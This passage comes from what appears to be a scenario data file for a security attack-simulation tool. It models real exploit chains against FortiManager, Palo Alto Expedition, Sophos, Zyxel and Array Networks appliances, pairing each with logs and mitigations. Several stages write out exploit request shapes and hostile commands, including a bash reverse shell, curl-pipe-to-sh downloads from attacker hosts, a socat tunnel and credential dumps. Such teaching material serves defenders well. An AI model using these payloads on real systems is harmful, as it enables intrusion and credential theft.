          'UNC5820 archives and exfiltrates the entire FortiManager revision database (/var/fwclient and /Storage/Postgresql), stealing the full configuration files, IPSec VPN keys, SD-WAN topologies, and administrative password hashes (`ENC AK1...`) of every managed FortiGate firewall in the enterprise.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Collection & Exfiltration (T1005 / T1552.001)',
        technicalCommands: [
          'tar -czf /tmp/.tm.tar.gz /var/fwclient /var/fds/data',
          'Exfiltrate managed FortiGate device configs containing config system admin & config vpn ipsec phase1-interface',
        ],
        defenseMitigation:
          'If FortiManager was compromised via CVE-2024-47575, rotate all administrative passwords, LDAP/RADIUS secrets, and IPSec pre-shared keys across every downstream managed FortiGate appliance.',
        logs: [
          {
            id: 'fmg-3',
            timestamp: '04:14:50.119',
            source: 'Firewall',
            severity: 'critical',
            raw: 'Mandiant UNC5820 Exfiltration Indicator | Source: FortiManager (/var/fwclient/*) | StagingArchive: /tmp/.tm.tar.gz | DestinationIP: 195.85.114.78:443 | Impact: Complete compromise of downstream managed FortiGate configurations and ENC password hashes',
            parsedFields: {
              ExfiltratedDirectory: '/var/fwclient/* (All Managed FortiGate Configs)',
              ExposedCredentials: 'FortiOS Admin Hashes (ENC AK1/PBKDF2) & IPSec PSKs',
              DownstreamBlastRadius: 'Enterprise-Wide FortiGate Fleet',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'paloalto-expedition-cve-2024-5910-chain',
    title: 'Palo Alto Expedition Admin Reset (CVE-2024-5910) & Cron RCE Chain (CVE-2024-9463)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2024-5910',
    description:
      'Attackers chain an unauthenticated administrator password reset vulnerability (CVE-2024-5910) with an OS command injection flaw (CVE-2024-9463) in Palo Alto Networks Expedition migration servers to gain root access and dump stored PAN-OS firewall API keys and multi-vendor configuration backups.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Attacker (restoreAdmin.php)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Palo Alto Expedition Web UI', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Expedition Cron Daemon & MySQL DB', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Horizon3 / Unit 42 Telemetry', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Managed PAN-OS Firewalls (API Keys)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Admin Credential Reset via restoreAdmin.php (CVE-2024-5910)',
        narration:
          'The attacker sends a single unauthenticated HTTP request to /OS/startup/restoreAdmin.php on the Palo Alto Expedition server, triggering CVE-2024-5910 to overwrite the default admin user’s password in the MySQL database back to the factory password ("paloalto").',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /OS/startup/restoreAdmin.php HTTP/1.1 (Unauthenticated admin credential reset - CVE-2024-5910)',
          'POST /bin/Auth.php (Login with username=admin & password=paloalto)',
        ],
        defenseMitigation:
          'Upgrade Palo Alto Expedition to version 1.2.96+, restrict access to authorized administrative jump hosts, and shut down Expedition servers when not actively migrating firewall configs.',
        logs: [
          {
            id: 'exp-1',
            timestamp: '10:15:04.220',
            source: 'WAF',
            severity: 'critical',
            raw: 'Apache Access Log (Expedition) | POST /OS/startup/restoreAdmin.php HTTP/1.1 200 | FollowUp: POST /bin/Auth.php (user=admin) 200 OK | Note: Unauthenticated Admin Takeover via CVE-2024-5910',
            parsedFields: {
              VulnerableScript: '/OS/startup/restoreAdmin.php',
              ExploitedCve: 'CVE-2024-5910',
              ResetCredential: 'admin / paloalto',
            },
          },
        ],
        packets: [
          {
            id: 'exp-pkt-1',
            timestamp: '10:15:04.200',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.91',
            destIp: '10.50.1.30',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 280,
            hexDump: '50 4F 53 54 20 2F 4F 53 2F 73 74 61 72 74 75 70 2F 72 65 73 74 6F 72 65 41 64 6D 69 6E 2E 70 68 70 20 48 54 54 50 2F 31 2E 31',
            decodedString: 'POST /OS/startup/restoreAdmin.php HTTP/1.1 -> Resets Expedition admin password to "paloalto"',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: OS Command Injection via Cron/Checkpoint Import Handler (CVE-2024-9463 / CVE-2024-9464)',
        narration:
          'Using the hijacked admin session (or directly via unauthenticated CVE-2024-9463), the attacker injects shell commands into /bin/configurations/parsers/Checkpoint/CHECKPOINT.php or the scheduled jobs table, achieving root/www-data code execution on the Ubuntu host.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution & Privilege Escalation (T1059.004 - Unix Shell)',
        technicalCommands: [
          'POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php',
          'Payload: action=import&project=1&vendor=`bash -c "bash -i >& /dev/tcp/198.51.100.91/4444 0>&1"`',
        ],
        defenseMitigation:
          'Monitor Expedition servers for `/bin/sh` or `python3` processes spawned by `www-data` (`apache2`) or the root cron scheduler.',
        logs: [
          {
            id: 'exp-2',
            timestamp: '10:16:19.804',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'bash',
            CommandLine: '/bin/sh -c ... CHECKPOINT.php command injection',
            raw: 'Linux Process Alert | Parent: /usr/sbin/apache2 (www-data) | Endpoint: /bin/configurations/parsers/Checkpoint/CHECKPOINT.php | ExploitedCVE: CVE-2024-9463 / CVE-2024-9464 | Action: Reverse shell & MySQL database dump',
            parsedFields: {
              VulnerableEndpoint: '/bin/configurations/parsers/Checkpoint/CHECKPOINT.php',
              ExploitedCve: 'CVE-2024-9463 / CVE-2024-9464',
              ExecutionUser: 'www-data / root cron',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Dumping MySQL PAN-OS Firewall API Keys & Multi-Vendor Config Backups',
        narration:
          'Because Expedition is used to migrate and manage live firewalls, the attacker dumps the local MySQL database (devices and users tables) and decrypts stored PAN-OS XML API keys, Cisco ASA/Check Point running-configs, and LDAP credentials to pivot directly onto production perimeter firewalls.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access & Lateral Movement (T1552.001 / T1078)',
        technicalCommands: [
          'mysqldump -u root -ppaloalto pandb devices > /tmp/pan_devices.sql',
          'curl -sk "https://panos-fw.corp.local/api/?type=export&category=configuration&key=LUFRPT1StolenApiKey..."',
        ],
        defenseMitigation:
          'Purge all imported firewall configurations and API keys from Expedition after migration projects conclude and rotate all PAN-OS API keys immediately.',
        logs: [
          {
            id: 'exp-3',
            timestamp: '10:18:42.510',
            source: 'Firewall',
            severity: 'critical',
            raw: 'PAN-OS XML API Audit | Request: type=export&category=configuration | AdminUser: expedition-svc | SourceIP: 10.50.1.30 (Expedition Host) | Status: Full running-config.xml exported via stolen API key',
            parsedFields: {
              StolenCredentialType: 'PAN-OS XML API Key (LUFRPT1...)',
              DatabaseTable: 'pandb.devices',
              LateralTarget: 'Production PAN-OS Perimeter Firewalls',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'sophos-firewall-cve-2022-3236-asnarok',
    title: 'Sophos Firewall User Portal/Webadmin JSON Code Injection (CVE-2022-3236 / DriftingCloud)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2022-3236',
    description:
      'Threat actor DriftingCloud exploits an unauthenticated code injection zero-day (CVE-2022-3236) in the User Portal and Webadmin interfaces of Sophos Firewall appliances via crafted JSON mode=151 login requests, achieving root execution to hook login CGIs and establish covert Reverse SSH / Socat tunnels.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'DriftingCloud Operator (JSON Payload)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Sophos Firewall (User Portal / Webadmin)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'csc Service Daemon (Root Execution)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Volexity / Sophos X-Ops Telemetry', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Intercepted VPN Credentials & Internal LAN', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Crafted JSON mode=151 Request to /webconsole/Controller (CVE-2022-3236)',
        narration:
          'DriftingCloud sends an HTTP POST request to /webconsole/Controller or /userportal/Controller with mode=151 and a JSON parameter containing non-printable ASCII bytes (%00 / %0a) and shell metacharacters in the username field to bypass front-end validation.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /userportal/Controller HTTP/1.1',
          'Body: mode=151&json={"username":"admin\\u0000`curl -sk https://c2.example/s.sh | sh`","password":"x"}',
        ],
        defenseMitigation:
          'Ensure "Allow automatic installation of hotfixes" is enabled on Sophos Firewall, upgrade to v19.0 MR1 Build 365+, and never expose Webadmin or User Portal to the WAN.',
        logs: [
          {
            id: 'sophos-1',
            timestamp: '14:05:22.108',
            source: 'WAF',
            severity: 'critical',
            raw: 'Sophos Apache/Controller Log | POST /userportal/Controller | Mode: 151 | Parameter: json={"username":"admin\\u0000`...`"} | Result: Validation Bypass & Backend csc Code Injection (CVE-2022-3236)',
            parsedFields: {
              VulnerableEndpoint: '/userportal/Controller & /webconsole/Controller',
              RequestMode: 'mode=151 (Authentication Handler)',
              ExploitedCve: 'CVE-2022-3236',
              ThreatActor: 'DriftingCloud (China-Nexus APT)',
            },
          },
        ],
        packets: [
          {
            id: 'sophos-pkt-1',
            timestamp: '14:05:22.090',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.175',
            destIp: '203.0.113.45',
            port: 4444,
            flag: 'PSH-ACK',
            payloadSize: 490,
            hexDump: '50 4F 53 54 20 2F 75 73 65 72 70 6F 72 74 61 6C 2F 43 6F 6E 74 72 6F 6C 6C 65 72 20 48 54 54 50 2F 31 2E 31 0D 0A 0D 0A 6D 6F 64 65 3D 31 35 31 26 6A 73 6F 6E 3D',
            decodedString: 'POST /userportal/Controller HTTP/1.1 | mode=151&json={"username":"admin\\x00`sh /tmp/p`"}',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Cyberoam System Controller (csc) Perl/Shell Evaluation as Root',
        narration:
          'After the Java frontend strips or passes the null-terminated JSON string to the backend Cyberoam System Controller (csc) daemon, csc evaluates the unsanitized field inside a root-privileged Perl/shell execution context.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Unix Shell)',
        technicalCommands: [
          'csc daemon (UID 0) evaluates unsanitized JSON parameter -> spawns /bin/sh -c',
        ],
        defenseMitigation:
          'Monitor `/log/csc.log` and `/log/apache_access.log` on Sophos appliances for non-ASCII characters or shell metacharacters in `mode=151` or `mode=716` requests.',
        logs: [
          {
            id: 'sophos-2',
            timestamp: '14:05:22.640',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'sh',
            CommandLine: '/bin/sh -c curl -sk https://198.51.100.175/init.sh | sh',
            raw: 'Sophos X-Ops Appliance Telemetry | Parent: /bin/csc (UID: 0) | Child: /bin/sh -c | LogSource: /log/csc.log | Note: Unauthenticated root command execution via CVE-2022-3236',
            parsedFields: {
              BackendDaemon: '/bin/csc (Cyberoam System Controller)',
              ExecutionContext: 'root (UID 0)',
              LogFile: '/log/csc.log',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Trojanized Login CGI Credential Harvesting & Persistent Reverse Tunnel',
        narration:
          'DriftingCloud modifies the firewall’s web authentication files to silently log cleartext administrator and SSL VPN passwords as users sign in, and establishes a persistent Socat / SSH reverse tunnel to pivot into internal corporate networks.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access & Command and Control (T1556 / T1572 - Protocol Tunneling)',
        technicalCommands: [
          'Modify User Portal login handler to write cleartext credentials to /var/tmp/.auth.log',
          'socat TCP4-LISTEN:1080,fork OPENSSL:198.51.100.175:443,verify=0',
        ],
        defenseMitigation:
          'Perform filesystem integrity checks on Sophos Firewall web roots, rotate all VPN and Active Directory credentials that authenticated through the appliance, and inspect outbound TLS connections from the firewall itself.',
        logs: [
          {
            id: 'sophos-3',
            timestamp: '14:12:09.331',
            source: 'EDR',
            severity: 'critical',
            raw: 'Volexity DriftingCloud Post-Exploitation | ModifiedFile: /usr/share/userportal/Controller | CredentialStash: /var/tmp/.auth.log | TunnelProcess: socat OPENSSL:198.51.100.175:443',
            parsedFields: {
              HarvestedData: 'Cleartext Webadmin & SSL VPN User Passwords',
              PersistenceMechanism: 'Trojanized Controller + Socat TLS Reverse Relay',
              LateralPivot: 'Internal Corporate Subnet via Firewall Routing',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'zyxel-firewall-cve-2023-28771-ike-rce',
    title: 'Zyxel ZyWALL/ATP/USG IKEv2 UDP/500 Notify Packet Command Injection (CVE-2023-28771)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2023-28771',
    description:
      'Attackers send a single unauthenticated IKEv2 UDP packet to port 500 on Zyxel ZyWALL, ATP, and USG FLEX firewalls. A DES-CBC decryption and string_to_binary logging flaw in /sbin/sshipsecpm passes unsanitized Notify payload data directly to system(), granting instant root execution.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Attacker (UDP/500 IKEv2 Packet)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Zyxel Firewall WAN (UDP Port 500)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: '/sbin/sshipsecpm (string_to_binary -> system)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'TRAPA / Rapid7 Network Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'ZLD Appliance Root & LAN Interfaces', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Crafted Unauthenticated IKEv2 SA_INIT Notify Packet on UDP Port 500',
        narration:
          'The attacker sends a single UDP packet to port 500 containing an IKEv2_SA_INIT header and a Notify payload (Type 14 / NO_PROPOSAL_CHOSEN) whose Notification Data holds an 8-byte DES-CBC encrypted block followed by `;cmd;`.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'UDP -> 203.0.113.77:500 | IKEv2 Exchange: IKE_SA_INIT (34) | Payload: Notify (41)',
          'Notification Data: <48-byte DES-CBC header> + ";echo $((...));wget http://.../z -O /tmp/z;sh /tmp/z;"',
        ],
        defenseMitigation:
          'Update Zyxel ZyLD firmware to V5.36+ (ATP/USG FLEX/VPN) or V4.73 Patch 1+ (ZyWALL/USG) and restrict UDP port 500/4500 on the WAN to known peer IPSec gateway IPs.',
        logs: [
          {
            id: 'zyxel-1',
            timestamp: '00:19:44.102',
            source: 'Firewall',
            severity: 'critical',
            raw: 'Zyxel WAN UDP/500 Packet Alert | Protocol: IKEv2 | ExchangeType: 34 (IKE_SA_INIT) | NotifyMessageType: 14 | SourceIP: 185.220.101.33 | PayloadLength: 188 | Note: CVE-2023-28771 Exploit Signature',
            parsedFields: {
              Protocol: 'UDP Port 500 (IKEv2)',
              NotifyPayloadType: '14 (NO_PROPOSAL_CHOSEN)',
              ExploitedCve: 'CVE-2023-28771',
              AuthRequired: 'None (Pre-Authentication Single UDP Packet)',
            },
          },
        ],
        packets: [
          {
            id: 'zyxel-pkt-1',
            timestamp: '00:19:44.100',
            protocol: 'UDP',
            sourceIp: '185.220.101.33',
            destIp: '203.0.113.77',
            port: 500,
            flag: 'NONE',
            payloadSize: 188,
            hexDump: '29 00 00 7C 00 00 00 0E 3B 63 75 72 6C 20 68 74 74 70 3A 2F 2F 31 38 35 2E 32 32 30 2E 31 30 31 2E 33 33 2F 73 20 7C 20 73 68 3B',
            decodedString: 'IKEv2 Notify Payload (Type 14): <DES-CBC block>";curl http://185.220.101.33/s | sh;"',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: /sbin/sshipsecpm string_to_binary() & cmd_sn_write_log() Shell Injection',
        narration:
          'When `/sbin/sshipsecpm` processes the Notify payload inside `ikev2_packet_st_input_start`, it decrypts the first 48 bytes using a hardcoded DES-CBC key and passes the remaining attacker-controlled string into `string_to_binary()` and `cmd_sn_write_log()`, which constructs `echo ... >> /tmp/sdwan_vpndebug.log` and calls `system()` as root.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Unix Shell)',
        technicalCommands: [
          'Vulnerable Call in /sbin/sshipsecpm: snprintf(cmd, "echo %s >> /tmp/sdwan_vpndebug.log", unsanitized_notify_str)',
          'system(cmd) -> Executes injected ";curl ... | sh;" as root (UID 0)',
        ],
        defenseMitigation:
          'Never invoke `system()` to append diagnostic strings to log files; use standard file I/O (`fopen`/`fprintf`) and remove hardcoded cryptographic keys from packet decoders.',
        logs: [
          {
            id: 'zyxel-2',
            timestamp: '00:19:44.310',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'sh',
            CommandLine: 'sh -c echo ... ;curl http://185.220.101.33/s | sh; >> /tmp/sdwan_vpndebug.log',
            raw: 'Embedded Linux Process Alert | Parent: /sbin/sshipsecpm (UID: 0) | Function: cmd_sn_write_log | Command: sh -c echo ... ;curl http://185.220.101.33/s | sh; >> /tmp/sdwan_vpndebug.log',
            parsedFields: {
              VulnerableBinary: '/sbin/sshipsecpm',
              VulnerableFunction: 'string_to_binary() -> cmd_sn_write_log() -> system()',
              LogFileTarget: '/tmp/sdwan_vpndebug.log',
              ExecutionPrivilege: 'root (UID 0)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Root Persistence, IPSec VPN Credential Theft & Internal LAN Pivot',
        narration:
          'Running as root on the Zyxel firewall, the attacker extracts the startup configuration (`/conf/startup-config.conf`) containing VPN user credentials and IPSec pre-shared keys, modifies iptables rules to expose internal LAN services, and installs a persistent reverse shell.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access & Defense Evasion (T1552.001 / T1562.004)',
        technicalCommands: [
          'cat /conf/startup-config.conf | grep -E "user|password|pre-shared-key"',
          'iptables -I INPUT 1 -p tcp --dport 4444 -j ACCEPT',
        ],
        defenseMitigation:
          'Inspect `/tmp/sdwan_vpndebug.log` for command injection artifacts, audit `/conf/startup-config.conf` modifications, and rotate all Zyxel VPN and admin credentials.',
        logs: [
          {
            id: 'zyxel-3',
            timestamp: '00:20:15.704',
            source: 'Firewall',
            severity: 'critical',
            raw: 'Zyxel Post-Exploitation Alert | FileRead: /conf/startup-config.conf | FirewallRuleModified: iptables INPUT tcp/4444 ACCEPT | ReverseShell: Connected to 185.220.101.33:443',
            parsedFields: {
              StolenConfig: '/conf/startup-config.conf',
              FirewallTampering: 'iptables INPUT rule inserted',
              BlastRadius: 'Full LAN Routing & VPN Credential Compromise',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'array-networks-ag-vxag-cve-2023-28461',
    title: 'Array Networks AG SSL VPN X-AN-FILESHARE flags Header Bypass & LODEINFO (CVE-2023-28461)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2023-28461',
    description:
      'Earth Kasha (MirrorFace / APT10 subgroup) exploits an unauthenticated HTTP header authentication bypass and path traversal flaw (CVE-2023-28461) in Array Networks AG/vxAG SSL VPN gateways by setting flags=00300 in the X-AN-FILESHARE header, deploying webshells and pivoting into internal hosts with NOOPDOOR and LODEINFO.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Earth Kasha (MirrorFace) Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Array AG SSL VPN (/prx/000/http/localhost)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'ArrayOS Web Root (cals.php Webshell)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'JPCERT/CC & Trend Micro Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Internal Windows Host (LODEINFO / NOOPDOOR)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: X-AN-FILESHARE flags=00300 Header Authentication Bypass (CVE-2023-28461)',
        narration:
          'Earth Kasha sends an HTTP GET/POST request to `/prx/000/http/localhost/client_sec/.../add_folder` with the custom HTTP header `X-AN-FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../`. Setting bitflags in `flags` instructs the ArrayOS proxy to trust the request without verifying a valid session cookie and resolves `fshare_template` via relative path traversal.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'GET /prx/000/http/localhost/client_sec/%00/add_folder HTTP/1.1',
          'X-AN-FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248; fshare_template=../../../../etc/passwd',
        ],
        defenseMitigation:
          'Upgrade ArrayOS AG to version 9.4.0.484+ (which validates session state before honoring X-AN-FILESHARE flags) and disable unused FileShare modules on the SSL VPN gateway.',
        logs: [
          {
            id: 'array-1',
            timestamp: '07:22:14.088',
            source: 'WAF',
            severity: 'critical',
            raw: 'ArrayAG Proxy Alert | URI: /prx/000/http/localhost/client_sec/%00/add_folder | Header: X-AN-FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248; fshare_template=../../../../ | Result: Unauthenticated Auth Bypass & Path Traversal (CVE-2023-28461)',
            parsedFields: {
              VulnerableUri: '/prx/000/http/localhost/client_sec/...',
              ExploitHeader: 'X-AN-FILESHARE (flags=c3248 + fshare_template=../../../../)',
              ExploitedCve: 'CVE-2023-28461',
              ThreatActor: 'Earth Kasha (MirrorFace)',
            },
          },
        ],
        packets: [
          {
            id: 'array-pkt-1',
            timestamp: '07:22:14.050',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.231',
            destIp: '203.0.113.140',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 540,
            hexDump: '47 45 54 20 2F 70 72 78 2F 30 30 30 2F 68 74 74 70 2F 6C 6F 63 61 6C 68 6F 73 74 2F 63 6C 69 65 6E 74 5F 73 65 63 0D 0A 58 2D 41 4E 2D 46 49 4C 45 53 48 41 52 45 3A',
            decodedString: 'GET /prx/000/http/localhost/client_sec/%00/add_folder | X-AN-FILESHARE: flags=c3248; fshare_template=../../../../',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Arbitrary File Read of Gateway Configs & PHP Webshell Deployment',
        narration:
          'Leveraging the path traversal and file-upload primitives in the FileShare handler, Earth Kasha reads `/ca/conf/default.ampled` (extracting VPN and RADIUS/AD secrets) and writes a PHP webshell into the ArrayOS web root to execute arbitrary commands and deploy a pivot proxy (`s5n`).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence & Command and Control (T1505.003 - Web Shell / T1090)',
        technicalCommands: [
          'Read /ca/conf/default.ampled (ArrayOS configuration & authentication secrets)',
          'Write webshell & launch SOCKS5 proxy (/tmp/s5n) on the Array AG appliance',
        ],
        defenseMitigation:
          'Inspect ArrayOS filesystem directories for unauthorized `.php` files or ELF binaries in `/tmp` and `/var/tmp`, and monitor outbound connections initiated from the VPN appliance to internal subnets.',
        logs: [
          {
            id: 'array-2',
            timestamp: '07:25:49.612',
            source: 'EDR',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'httpd',
            raw: 'JPCERT/CC ArrayAG Forensics Alert | Action: Webshell & SOCKS5 Proxy Creation | ConfigRead: /ca/conf/default.ampled | CreatedBinary: /tmp/s5n | Note: Appliance converted into internal SOCKS5 relay',
            parsedFields: {
              ExfiltratedConfig: '/ca/conf/default.ampled',
              WebshellAndProxy: '/tmp/s5n (SOCKS5 Pivot Relay)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Internal Lateral Movement & LODEINFO / NOOPDOOR Memory Injection',
        narration:
          'Routing through the compromised Array AG appliance’s SOCKS5 proxy with stolen domain credentials, Earth Kasha moves laterally to internal Windows hosts and uses msbuild.exe or DLL side-loading (K7SysMn1.exe) to execute LODEINFO and NOOPDOOR in memory.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Defense Evasion & Execution (T1127.001 - MSBuild / T1574.002)',
        technicalCommands: [
          'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\ProgramData\\update.xml (NOOPDOOR XML C# inline task)',
          'K7SysMn1.exe -> side-loads K7DbgMN.dll (Decodes LODEINFO shellcode in memory)',
        ],
        defenseMitigation:
          'Block `MSBuild.exe` on non-developer endpoints via WDAC/AppLocker and monitor for side-loading of unsigned `K7DbgMN.dll` or anomalous SMB connections originating from the SSL VPN appliance IP.',
        logs: [
          {
            id: 'array-3',
            timestamp: '08:10:33.904',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'MSBuild.exe',
            CommandLine: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\ProgramData\\update.xml',
            raw: 'EventID: 1 | SourceIP: 10.0.0.2 (ArrayAG Internal Interface) | Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe | CommandLine: MSBuild.exe C:\\ProgramData\\update.xml | FollowUp: LODEINFO & NOOPDOOR In-Memory Implant',
            parsedFields: {
              LateralPivotSource: 'Array AG Internal Interface (10.0.0.2)',
              LolbinExecutor: 'MSBuild.exe (Inline C# Task)',
              DeployedImplants: 'LODEINFO & NOOPDOOR (Earth Kasha)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
];
